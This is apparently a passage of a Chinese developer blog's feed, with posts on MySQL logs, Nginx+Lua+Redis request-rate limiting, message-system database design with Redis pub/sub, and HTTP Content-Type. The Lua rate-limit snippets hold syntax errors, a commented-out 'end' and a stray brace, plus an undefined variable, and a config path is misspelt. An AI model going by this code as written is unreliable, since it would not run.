+<h1 id="0x02-Error-Log"><a href="#0x02-Error-Log" class="headerlink" title="0x02.Error Log"></a>0x02.Error Log</h1><p>MySQL错误日志默认以<code>hostname.err</code>存放在MySQL日志目录，如果不知道MySQL当前的错误日志目录可以使用查询语句：</p>
+<blockquote>
+<p>mysql&gt;  show variables like ‘log_error’;</p>
+</blockquote>
+<pre><code>+---------------+--------------------------------------+
+| Variable_name | Value                                |
++---------------+--------------------------------------+
+| log_error     | /usr/local/var/mysql/mysql-error.log |
++---------------+--------------------------------------+
+</code></pre><p>修改错误日志地址可以在<code>/etc/my.cnf</code>中添加<code>--log-error[=file_name]</code>选项来开启mysql错误日志。</p>
+<p>错误日志记录了MySQL Server每次启动和关闭的详细信息以及运行过程中所有较为严重的警告和错误信息。</p>
+<p>知道了MySQL错误日志地址，我们就可以查看MySQL错误日志：</p>
+<pre><code>2015-09-12 16:03:20 2624 [ERROR] InnoDB: Unable to lock ./ibdata1, error: 35
+2015-09-12 16:03:20 2624 [Note] InnoDB: Check that you do not already have another mysqld process using the same InnoDB data or log files.
+2015-09-13 00:03:21 2183 [Note] InnoDB: Shutdown completed; log sequence number 426783897
+</code></pre><p><code>InnoDB: Unable to lock ./ibdata1, error: 35</code> 可以得出资源被抢占，有可能是开了多个MySQL线程。</p>
+<p><br><hr></p>
+<h1 id="0x03-General-Query-Log"><a href="#0x03-General-Query-Log" class="headerlink" title="0x03.General Query Log"></a>0x03.General Query Log</h1><p>日常请求的SQL：<br>添加方式一样在 <code>/etc/my.cnf</code> 中添加 <code>general-log-file[=file_name]</code>。</p>
+<p><br><hr></p>
+<h1 id="0x04-Binary-Log"><a href="#0x04-Binary-Log" class="headerlink" title="0x04.Binary Log"></a>0x04.Binary Log</h1><h2 id="启用Binlog"><a href="#启用Binlog" class="headerlink" title="启用Binlog"></a>启用Binlog</h2><p>修改 <code>/etc/my.cnf</code>：</p>
+<pre><code>binlog_format = STATEMENT
+binlog_cache_size = 2M
+max_binlog_cache_size = 4M
+max_binlog_size = 512M
+log-bin = master-bin
+log-bin-index = master-bin.index
+</code></pre><p><code>log-bin-index</code> 指向 <code>master-bin</code> 这个文件，记录有哪些分块的Binlog文件名。<br><code>log-bin</code> 记录Binlog文件名前缀，后缀会用数字递增。</p>
+<h2 id="Binlog格式"><a href="#Binlog格式" class="headerlink" title="Binlog格式"></a>Binlog格式</h2><p>Binlog有3种格式，STATMENT,ROW,MIXED。<a href="https://dev.mysql.com/doc/refman/5.1/en/binary-log-mixed.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.1/en/binary-log-mixed.html</a></p>
+<p>混合格式（mixed）会在适当时候切换row和statment格式，statment就是直接的SQL语句格式。</p>
+<h2 id="分析Binlog"><a href="#分析Binlog" class="headerlink" title="分析Binlog"></a>分析Binlog</h2><p>通过MySQL自带的mysqlbinlog 命令，可以直接查看到Binlog转码数据：</p>
+<blockquote>
+<p>mysqlbinlog /usr/local/var/mysql/master-bin.000117</p>
+</blockquote>
+<p>得到：</p>
+<pre><code># at 335
+#150913  0:05:12 server id 1  end_log_pos 366 CRC32 0xa31b50db     Xid = 151
+COMMIT/*!*/;
+DELIMITER ;
+# End of log file
+ROLLBACK /* added by mysqlbinlog */;
+/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/;
+/*!50530 SET @@SESSION.PSEUDO_SLAVE_MODE=0*/;
+</code></pre><p>第一行包含日志文件偏移字节值（335）。</p>
+<p>第二行包含：</p>
+<ul>
+<li><p>事件的日期事件，MySQL会使用他们来产生SET TIMESTAMP</p>
+</li>
+<li><p>服务器的服务器id</p>
+</li>
+<li><p>end_log_pos 下一个事件的偏移字节</p>
+</li>
+<li><p>事件类型，这里是Xid，常见的还有其他，例如：Intvar，Query，Stop，Format_desc</p>
+</li>
+<li><p>原服务器上执行语句的线程id，用于审计和CONNECTION_ID()</p>
+</li>
+<li><p>exec_time对于master端的Binlog来说是执行这个event所花费的时间</p>
+</li>
+<li><p>原服务器产生的错误代码</p>
+</li>
+</ul>
+<p>通过</p>
+<blockquote>
+<p>mysql&gt; show binlog events;</p>
+</blockquote>
+<p>也可以的到binlog数据：</p>
+<pre><code>| master-bin.000002 | 3861 | Query       |         1 |        3954 | BEGIN                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| master-bin.000002 | 3954 | Intvar      |         1 |        3986 | INSERT_ID=5                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
+| master-bin.000002 | 3986 | Query       |         1 |        4475 | use `dropbox`; INSERT INTO `UserLog` (`uid`, `fids`, `nids`, `msg`, `log`, `from`, `type`, `ctime`) VALUES (&#39;1&#39;, &#39;[\&quot;35\&quot;,\&quot;33\&quot;,\&quot;21\&quot;]&#39;, &#39;[\&quot;22\&quot;,\&quot;21\&quot;,\&quot;11\&quot;,\&quot;4\&quot;,\&quot;3\&quot;]&#39;, &#39;从垃圾箱恢复: 恢复文件 \&#39;[\&quot;35\&quot;,\&quot;33\&quot;,\&quot;21\&quot;]\&#39; 恢复文件夹 \&#39;[\&quot;22\&quot;,\&quot;21\&quot;,\&quot;11\&quot;,\&quot;4\&quot;,\&quot;3\&quot;]\&#39;&#39;, &#39;[[\&quot;35\&quot;,\&quot;33\&quot;,\&quot;21\&quot;],[\&quot;22\&quot;,\&quot;21\&quot;,\&quot;11\&quot;,\&quot;4\&quot;,\&quot;3\&quot;]]&#39;, &#39;cloud.jue.so&#39;, &#39;recover_by_trash&#39;, &#39;2015-09-07 00:51:31&#39;)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
+| master-bin.000002 | 4475 | Xid         |         1 |        4506 | COMMIT /* xid=423 */
+</code></pre><h2 id="查看Binlog信息"><a href="#查看Binlog信息" class="headerlink" title="查看Binlog信息"></a>查看Binlog信息</h2><blockquote>
+<p>mysql&gt; show variables like ‘%binlog%’;</p>
+</blockquote>
+<pre><code>+-----------------------------------------+----------------------+
+| Variable_name                           | Value                |
++-----------------------------------------+----------------------+
+| binlog_cache_size                       | 2097152              |
+| binlog_checksum                         | CRC32                |
+| binlog_direct_non_transactional_updates | OFF                  |
+| binlog_error_action                     | IGNORE_ERROR         |
+| binlog_format                           | STATEMENT            |
+| binlog_gtid_simple_recovery             | OFF                  |
+| binlog_max_flush_queue_time             | 0                    |
+| binlog_order_commits                    | ON                   |
+| binlog_rows_query_log_events            | OFF                  |
+| binlog_stmt_cache_size                  | 32768                |
+| binlogging_impossible_mode              | IGNORE_ERROR         |
+| innodb_api_enable_binlog                | OFF                  |
+| innodb_locks_unsafe_for_binlog          | OFF                  |
+| max_binlog_cache_size                   | 4194304              |
+| max_binlog_size                         | 536870912            |
+| max_binlog_stmt_cache_size              | 18446744073709547520 |
+| simplified_binlog_gtid_recovery         | OFF                  |
++-----------------------------------------+----------------------+
+</code></pre><p><br><hr></p>
+<h1 id="Slow-Query-Log"><a href="#Slow-Query-Log" class="headerlink" title="Slow Query Log"></a>Slow Query Log</h1><h2 id="开启-Slow-Query"><a href="#开启-Slow-Query" class="headerlink" title="开启 Slow Query"></a>开启 Slow Query</h2><p>修改<code>/etc/my.cnf</code>：</p>
+<pre><code>slow-query-log = 1
+slow-query-log-file = /usr/loval/var/mysql/mysql-slow.log
+long_query_time = 1 #设置满请求时间
+log-queries-not-using-indexes
+</code></pre><h2 id="Slow-Query工具"><a href="#Slow-Query工具" class="headerlink" title="Slow Query工具"></a>Slow Query工具</h2><p>Slow Query有很多查看工具，比如：MySQL自带的mysqldumpslow 和 mysqlsla，用的比较多的 py-query-digest，还可以将满请求数据丢给zabbix做显示分析处理。</p>
+<p>这里我用 <code>py-query-digest /usr/local/var/mysql/mysql-slow.log</code> 导出了满请求的数据，例如：</p>
+<pre><code># Query 1: 0.02 QPS, 0.55x concurrency, ID 0xFC19E4D04D8E60BF at byte 12547
+# This item is included in the report because it matches --limit.
+# Scores: V/M = 118.26
+# Time range: 2015-09-12 05:52:03 to 05:57:54
+# Attribute    pct   total     min     max     avg     95%  stddev  median
+# ============ === ======= ======= ======= ======= ======= ======= =======
+# Count          1       7
+# Exec time     78    194s   250ms    169s     28s    167s     57s   992ms
+# Lock time      0   901us   111us   158us   128us   152us    18us   119us
+# Rows sent      0       5       0       1    0.71    0.99    0.45    0.99
+# Rows examine   7 545.01k  14.18k  97.66k  77.86k  97.04k  32.08k  97.04k
+# Query size     0     868     123     125     124  124.25       1  118.34
+# String:
+# Databases    mysqltest
+# Hosts        localhost
+# Users        root
+# Query_time distribution
+#   1us
+#  10us
+# 100us
+#   1ms
+#  10ms
+# 100ms  ################################################################
+#    1s  ##########################################
+#  10s+  ##########################################
+# Tables
+#    SHOW TABLE STATUS FROM `mysqltest` LIKE &#39;File&#39;\G
+#    SHOW CREATE TABLE `mysqltest`.`File`\G
+#    SHOW TABLE STATUS FROM `mysqltest` LIKE &#39;User&#39;\G
+#    SHOW CREATE TABLE `mysqltest`.`User`\G
+# EXPLAIN /*!50100 PARTITIONS*/
+SELECT count(*) FROM `File` LEFT JOIN `User` ON `User`.`name`= `File`.`name` WHERE `User`.`name` LIKE &#39;%r%&#39; order by `last`\G
+</code></pre><p>可以看到该SQL被调用7次，平均每次28s，好慢…平均检测数据大小77.86k。</p>
+<p>再来看看SQL语句：</p>
+<blockquote>
+<p>SELECT count(*) FROM <code>File</code> LEFT JOIN <code>User</code> ON <code>User</code>.<code>name</code>= <code>File</code>.<code>name</code> WHERE <code>User</code>.<code>name</code> LIKE ‘%r%’ order by last</p>
+</blockquote>
+<p>看着都觉得慢 <code>ON User.name= File.name</code> 在没有建立索引的情况下，所有数据将进行字符串匹配name字段。</p>
+<p>这个库有 15W条User数据，10W条File数据，也就是要比对15*10 WW 次数据。</p>
+<p>MySQL的slow log的作用也就在这里了，优化慢查询。</p>
+<p><br><hr></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>1.《高性能MySQL》</p>
+<p>2.<a href="https://rtcamp.com/tutorials/mysql/slow-query-log/" target="_blank" rel="external">Analyse slow-query-log using mysqldumpslow &amp; pt-query-digest</a></p>
+<p>3.<a href="https://xcoder.in/2015/08/10/mysql-binlog-try/" target="_blank" rel="external">初探MySQL的Binlog</a></p>
+<p>4.<a href="http://dev.mysql.com/doc/internals/en/event-data-for-specific-event-types.html" target="_blank" rel="external">MySQL doc</a></p>
+<p><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-12-mysql-log"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-12-mysql-log" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/09/12/mysql-log"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/09/12/mysql-log">http://homeway.me/2015/09/12/mysql-log</a></h4><p>-by小草</p>
+<p>2015-09-12 01:49:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://xiaocao.u.qiniudn.com/blog/logo-mysql.png&quot; alt=&quot;mysql-log&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Mysql" scheme="https://homeway.me/tags/Mysql/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Nginx+Lua+Redis访问频率控制</title>
+    <link href="https://homeway.me/2015/08/11/nginx-lua-redis-access-control/"/>
+    <id>https://homeway.me/2015/08/11/nginx-lua-redis-access-control/</id>
+    <published>2015-08-10T16:24:10.000Z</published>
+    <updated>2017-01-13T12:56:02.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx-lua.png" alt="nginx-lua-redis"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>Nginx来处理访问控制的方法有多种，实现的效果也有多种，访问IP段，访问内容限制，访问频率限制等。</p>
+<p>用Nginx+Lua+Redis来做访问限制主要是考虑到高并发环境下快速访问控制的需求。</p>
+<p>Nginx处理请求的过程一共划分为11个阶段，分别是：</p>
+<p>post-read、server-rewrite、find-config、rewrite、post-rewrite、 preaccess、access、post-access、try-files、content、log.</p>
+<p>在openresty中，可以找到：</p>
+<p>set_by_lua，access_by_lua，content_by_lua，rewrite_by_lua等方法。</p>
+<p>那么访问控制应该是，access阶段。</p>
+<p><br><hr></p>
+<h1 id="0x02-How-to-do"><a href="#0x02-How-to-do" class="headerlink" title="0x02.How to do"></a>0x02.How to do</h1><h2 id="1-Solution"><a href="#1-Solution" class="headerlink" title="1.Solution"></a>1.Solution</h2><p>按照正常的逻辑思维，我们会想到的访问控制方案如下：</p>
+<p>1.检测是否被forbidden？<br>    =》是，forbidden是否到期：是，清除记录，返回200，正常访问；否，返回403；<br>    =》否，返回200，正常访问</p>
+<p>2.每次访问，访问用户的访问频率+1处理</p>
+<p>3.检测访问频率是否超过限制，超过即添加forbidden记录，返回403</p>
+<p>这是简单地方案，还可以添加点枝枝叶叶，访问禁止时间通过算法导入，每次凹曲线增加。</p>
+<h2 id="2-Config"><a href="#2-Config" class="headerlink" title="2.Config"></a>2.Config</h2><p>首先为nginx添加vhost配置文件，vhost.conf部分内容如下：</p>
+<pre><code>lua_package_path &quot;/usr/local/openresty/lualib/?.lua;;&quot;;#告诉openresty库地址
+lua_package_cpath &quot;/usr/local/openresty/lualib/?.so;;&quot;;
+error_log /usr/local/openresty/nginx/logs/openresty.debug.log debug;
+
+server {
+    listen 8080 default;
+    server_name localhost;    
+    root  /www/openresty;
+
+    location /login {
+        default_type &#39;text/html&#39;;
+        access_by_lua_file &quot;/usr/local/openresty/nginx/lua/access_by_redis.lua&quot;;#通过lua来处理访问控制
+    }
+}
+</code></pre><h2 id="3-Access-by-redis-lua"><a href="#3-Access-by-redis-lua" class="headerlink" title="3.Access_by_redis.lua"></a>3.Access_by_redis.lua</h2><p>参考了下v2ex.com的做法，redis存储方案只做简单地string存储就足够了。key分别是：</p>
+<p>用户登录记录：user:127.0.0.1:time（unix时间戳）<br>访问限制：block:127.0.0.1</p>
+<p>先连接Redis吧：</p>
+<pre><code>local red = redis:new()
+function M:redis()
+    red:set_timeout(1000)
+    local ok, err = red:connect(&quot;127.0.0.1&quot;, 6379)
+    if not ok then
+        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR)
+    end
+end
+</code></pre><p>按照我们的逻辑方案，第二步是，检测是否forbidden，下面我们就检测<code>block:127.0.0.1</code>，如果搜索到数据，检测时间是否过期，未过期返回403，否则直接返回200：</p>
+<pre><code>function M:check1()
+    local time=os.time()    --system time
+    local res, err = red:get(&quot;block:&quot;..ngx.var.remote_addr)
+    if not res then    -- redis error
+        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR) --redis get data error     end
+
+    if type(res) == &quot;string&quot; then --if red not null then type(red)==string
+        if tonumber(res) &gt;= tonumber(time) then  --check if forbidden expired
+            ngx.exit(ngx.HTTP_FORBIDDEN)
+            --ngx.say(&quot;forbidden&quot;)
+        end
+    end
+}
+</code></pre><p>接下来会做检测，是否访问频率过高，如果过高，要拉到黑名单的，</p>
+<p>实现的方法是，检测<code>user:127.0.0.1:time</code>的值是否超标：</p>
+<pre><code>function M:check2()
+    local time=os.time()    --system time
+    local res, err = red:get(&quot;user:&quot;..ngx.var.remote_addr..&quot;:&quot;..time)
+    if not res then    -- redis error
+        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR) --redis get data error
+    end
+
+    if type(res) == &quot;string&quot; then
+        if tonumber(res) &gt;= 10 then -- attack, 10 times request/s
+            red:del(&quot;block:&quot;..self.ip)    
+            red:set(&quot;block:&quot;..self.ip, tonumber(time)+5*60 ) --set block time
+            ngx.exit(ngx.HTTP_FORBIDDEN)
+        end
+    end
+end
+</code></pre><p>最后呢，还要记得，把每次访问时间做一个自增长，<code>user:127.0.0.1:time</code>：</p>
+<pre><code>function M:add()
+    local time=os.time()    --system time
+    ok, err = red:incr(&quot;user:&quot;..ngx.var.remote_addr..&quot;:&quot;..time)
+    if not ok then
+        ngx.exit(ngx.HTTP_INTERNAL_SERVER_ERROR) --redis get data error
+    end
+end
+</code></pre><p>那么，测试，强刷几次浏览器，发现过一会，返回了403，ok，搞定。</p>
+<p><br><hr></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-11-nginx-lua-redis-access-control"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-11-nginx-lua-redis-access-control" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/08/11/nginx-lua-redis-access-control/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/08/11/nginx-lua-redis-access-control/">http://homeway.me/2015/08/11/nginx-lua-redis-access-control/</a></h4><p>-by小草</p>
+<p>2015-08-10 01:20:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx-lua.png&quot; alt=&quot;nginx-lua-redis&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Nginx" scheme="https://homeway.me/tags/Nginx/"/>
+    
+      <category term="Lua" scheme="https://homeway.me/tags/Lua/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>站内消息设计与实现</title>
+    <link href="https://homeway.me/2015/08/03/website-system-message/"/>
+    <id>https://homeway.me/2015/08/03/website-system-message/</id>
+    <published>2015-08-02T16:56:01.000Z</published>
+    <updated>2015-08-04T13:40:13.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-sql-nosql.png" alt="http"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>最近在处理系统消息模块，查阅了很多实践案例，各有针对性。</p>
+<p>首先站内消息主要包括：个人消息（评论，点赞），系统消息，订阅消息，私信。</p>
+<p>其中，订阅区分用户群，即系统消息是一个特殊的所有人订阅的订阅消息，特点是一对多。</p>
+<p>前三个实时性比较低，最后一个实时性高，离线状态下是私信，如果双方在线要转为聊天室，特点是一对一。</p>
+<p>那么，接下来，该选个方案了，SQL or NoSQL?</p>
+<p><br><hr></p>
+<h1 id="0x02-Mysql实现"><a href="#0x02-Mysql实现" class="headerlink" title="0x02.Mysql实现"></a>0x02.Mysql实现</h1><p>首先，对于个人消息、私信(“UserMessage”)，一条消息插一句，Mysql跑跑没问题。</p>
+<p>对于系统消息或订阅消息，必然不可以，假如有10万用户，一次性那么要插入10万条消息，Mysql必死。</p>
+<p>那么就是说，要设立一个系统库（”SystemMessage”），每当用户登录，就去跑跑系统库(“SystemMessage”)，把未读的系统库跑到个人库。</p>
+<p>关于订阅消息就比较麻烦了，对用户分组？对消息分组？</p>
+<p>关系型数据库处理集合问题是比较麻烦的，目前想到的结论是建立一个表(“RssMessage”)存储消息类型，消息索引。</p>
+<p>下面列了大致的数据库模型：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-08-03-website-system-message.1.png" alt="Mysql"></p>
+<p>看完这个数据库设计，我也觉得好难受，吐槽前先来想想为什么吧。</p>
+<p>UserSystemRelation表用于记录用户读取到哪个位置的标记。</p>
+<p>可以看到，UserMessage与SystemMessage表中，title、tid、ctime、type字段冗余了，好像也没必要，</p>
+<p>但是从用户功能上看，当用户登陆后，查找自己站内消息，必然要用到的有：status，必然要显示的有：title、ctime，type作为用户进入消息面板后，要筛选的方式之一，这样的话，Mysql就只要跑一个表就可以完成显示给用户的最新站内消息了。</p>
+<p>由于MessageText可能是一个大信息通知，用户查看个人消息时候，并未查看MessageText内容，所以单独放一张表。</p>
+<h2 id="相应处理流程"><a href="#相应处理流程" class="headerlink" title="相应处理流程"></a>相应处理流程</h2><ul>
+<li>用户登录后，先通过”UserSystemRelation”表查询是否有新的系统消息</li>
+<li>如果”UserSystemRelation”，查找到自身uid，同步系统消息到个人消息；如果”UserSystemRelation”未查找到自身uid，直接插入”UserSystemRelation”，并读取最近50条系统消息。</li>
+<li>用户点击未读消息，获取”MessageText””，并更新状态(status)为已读。</li>
+<li>用户通过”status”、”type”，可以筛选系统消息。</li>
+</ul>
+<p><br><hr></p>
+<h1 id="0x03-Mysql-MongoDB实现"><a href="#0x03-Mysql-MongoDB实现" class="headerlink" title="0x03.Mysql+MongoDB实现"></a>0x03.Mysql+MongoDB实现</h1><p>由于Mongodb是一种文档型的数据结构，所以，可以考虑把所有数据转成json直接塞给Mongodb。</p>
+<p>基于用户的习惯，读多写少，大部分时候都是看到消息，删除、更新比较少，如果数据没更新直接读Mongodb，如果数据更新，直接删除Mongodb<br>的索引。</p>
+<p>这个考虑是在，用户数量很大的时候，要在”UserSystem”表里查找到用户消息比较慢的时候用，类似于吧Mongodb当缓存。</p>
+<p><br><hr></p>
+<h1 id="0x04-Redis实现"><a href="#0x04-Redis实现" class="headerlink" title="0x04.Redis实现"></a>0x04.Redis实现</h1><p>看了Mysql下站内消息的数据库设计，我也觉得很蛋疼，临时过渡没事，但是还是NoSQL合适。</p>
+<p>Redis自带订阅与发布系统，<a href="http://redisbook.readthedocs.org/en/latest/feature/pubsub.html" target="_blank" rel="external">http://redisbook.readthedocs.org/en/latest/feature/pubsub.html</a></p>
+<p>在下图展示的这个 pubsub_channels 示例中， client2 、 client5 和 client1 就订阅了 channel1 ， 而其他频道也分别被别的客户端所订阅：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-08-03-website-system-message.2.png" alt="订阅"></p>
+<p>只要是订阅了相应地频道，就会收到频道的消息。</p>
+<p>把用户ID作为频道，私信就是反向的频道订阅，系统消息就是所有用户的订阅，那么离线的消息呢？</p>
+<h2 id="1、线上用户"><a href="#1、线上用户" class="headerlink" title="1、线上用户"></a>1、线上用户</h2><p>还是存在系统或个人的哈希表里，等上线后再去读取。</p>
+<p>在Python中，订阅发布消息(Publish)如下：</p>
+<pre><code>import redis,time
+queue = redis.StrictRedis(host=&#39;localhost&#39;, port=6379, db=0)
+channel = queue.pubsub()
+
+for i in range(100): 
+    queue.publish(&quot;test&quot;, i)
+    time.sleep(0.1)
+</code></pre><p>Python中，订阅监听消息(Subcribe)如下：</p>
+<pre><code>import redis,time
+r = redis.StrictRedis(host=&#39;localhost&#39;, port=6379, db=0)
+p = r.pubsub()
+p.subscribe(&#39;test&#39;)
+
+while True:
+    message = p.get_message()
+    if message:
+        print &quot;Subscriber: %s&quot; % message[&#39;data&#39;]
+</code></pre><p>Redis-py的API可以看GitHub：<a href="https://github.com/andymccurdy/redis-py" target="_blank" rel="external">https://github.com/andymccurdy/redis-py</a></p>
+<p>这是线上用户做法。</p>
+<h2 id="2、线下用户"><a href="#2、线下用户" class="headerlink" title="2、线下用户"></a>2、线下用户</h2><p>看过一种做法是建立一个Redis链表，存储登陆用户，当用户登陆就直接发送，没登陆就暂存起来。</p>
+<p>这里的话，可以用WebSocket实时监听，定期发送心跳包，如果在线直接返回Redis自带的订阅系统。</p>
+<p>系统消息建立一个集合：</p>
+<blockquote>
+<p>SADD system:2015-08-03 7 8 9 10 11</p>
+</blockquote>
+<p>第一段标示系统信息，第二段标示日期，后面的数字标示message id。</p>
+<p>个人消息建立一个集合：</p>
+<blockquote>
+<p>SADD user:12345:read    1 2 3 4 </p>
+</blockquote>
+<p>第一段标示用户信息集合，第二段标示用户id，下一段标示消息类型为已读，后面的数字标示message id。</p>
+<p>关于订阅消息如下：</p>
+<blockquote>
+<p>SADD rss:xiaocao 12 13 14 15</p>
+</blockquote>
+<p>那么你就收到小草的订阅消息，消息ID分别是 12, 13, 14, 15</p>
+<p>还有很重要的消息数据存储，</p>
+<blockquote>
+<p>HMSET message:12 title 标题 content 内容 date 2015-08-03</p>
+</blockquote>
+<p>Python创建数据库的例子就是：</p>
+<pre><code>import redis,time,threading,random
+pool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, db=1)
+rs = redis.Redis(connection_pool=pool)
+
+rs.sadd(&quot;user:123:read&quot;, &quot;1&quot;, &quot;2&quot;)
+rs.sadd(&quot;user:123:unread&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;)
+rs.sadd(&quot;system:2015-08-03&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;10&quot;, &quot;11&quot;)
+rs.sadd(&quot;rss:xiaocao&quot;, &quot;12&quot;, &quot;13&quot;, &quot;14&quot;, &quot;15&quot;, &quot;11&quot;)
+
+for i in range(15):
+    rs.hset(&quot;message:&quot;+str(i), &quot;title&quot;, &quot;title=&gt;&quot;+str(random.uniform(1, 99999)))
+    rs.hset(&quot;message:&quot;+str(i), &quot;content&quot;,&quot;content=&gt;&quot;+str(time.time()))
+    rs.hset(&quot;message:&quot;+str(i), &quot;date&quot;, str(time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.gmtime())))
+</code></pre><p><br></p>
+<p>参考：</p>
+<ul>
+<li><a href="http://redisbook.readthedocs.org/en/latest/feature/pubsub.html" target="_blank" rel="external">http://redisbook.readthedocs.org/en/latest/feature/pubsub.html</a></li>
+<li><a href="http://huoding.com/2012/02/29/146" target="_blank" rel="external">http://huoding.com/2012/02/29/146</a></li>
+<li><a href="http://yijiebuyi.com/blog/faa9e68cb296d88bbc65b24dbc7b8de1.html" target="_blank" rel="external">http://yijiebuyi.com/blog/faa9e68cb296d88bbc65b24dbc7b8de1.html</a></li>
+<li><a href="http://www.cnblogs.com/grenet/archive/2010/03/08/1680655.html" target="_blank" rel="external">http://www.cnblogs.com/grenet/archive/2010/03/08/1680655.html</a></li>
+</ul>
+<p><br><hr></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-03-website-system-message"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-08-03-website-system-message" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/08/03/website-system-message/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/08/03/website-system-message/">http://homeway.me/2015/08/03/website-system-message/</a></h4><p>-by小草</p>
+<p>2015-08-03 01:35:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-sql-nosql.png&quot; alt=&quot;http&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Mysql" scheme="https://homeway.me/tags/Mysql/"/>
+    
+      <category term="Redis" scheme="https://homeway.me/tags/Redis/"/>
+    
+      <category term="Moogodb" scheme="https://homeway.me/tags/Moogodb/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>理解HTTP之Content-Type</title>
+    <link href="https://homeway.me/2015/07/19/understand-http-about-content-type/"/>
+    <id>https://homeway.me/2015/07/19/understand-http-about-content-type/</id>
+    <published>2015-07-18T16:56:01.000Z</published>
+    <updated>2015-08-04T13:48:22.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-http.png" alt="http"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>查看Restful API 报头插件：<a href="https://chrome.google.com/webstore/detail/rest-console/cokgbflfommojglbmbpenpphppikmonn/related?utm_source=chrome-ntp-icon" target="_blank" rel="external">Chrome插件REST Console</a>，以及发送Restful API工具：<a href="https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?utm_source=chrome-ntp-icon" target="_blank" rel="external">Chrome插件POST Man</a></p>
+<p>在HTTP 1.1规范中，HTTP请求方式有OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE、CONNECT</p>
+<p>通常我们用的只有GET、POST，然而对于Restful API规范来说，请求资源要用PUT方法，删除资源要用DELETE方法。</p>
+<p>例如发送个DELETE包：</p>
+<blockquote>
+<p><a href="http://example.com/my/resource?id=12345" target="_blank" rel="external">http://example.com/my/resource?id=12345</a> </p>
+</blockquote>
+<p>那么通过id就能获取到信息，这个包只有header，并不存在body，下面讨论几个包含body的发包的body传输格式。</p>
+<p><br><hr></p>
+<h1 id="0x02-Content-Type"><a href="#0x02-Content-Type" class="headerlink" title="0x02.Content-Type"></a>0x02.Content-Type</h1><p>Content-Type用于指定内容类型，一般是指网页中存在的Content-Type，Content-Type属性指定请求和响应的HTTP内容类型。如果未指定 ContentType，默认为text/html。</p>
+<p>在nginx中有个配置文件<code>mime.types</code>，主要是标示Content-Type的文件格式。</p>
+<p>下面是几个常见的Content-Type:</p>
+<p>1.text/html<br>2.text/plain<br>3.text/css<br>4.text/javascript<br>5.application/x-www-form-urlencoded<br>6.multipart/form-data<br>7.application/json<br>8.application/xml<br>…</p>
+<p>前面几个都很好理解，都是html，css，javascript的文件类型，后面四个是POST的发包方式。</p>
+<p><br><hr></p>
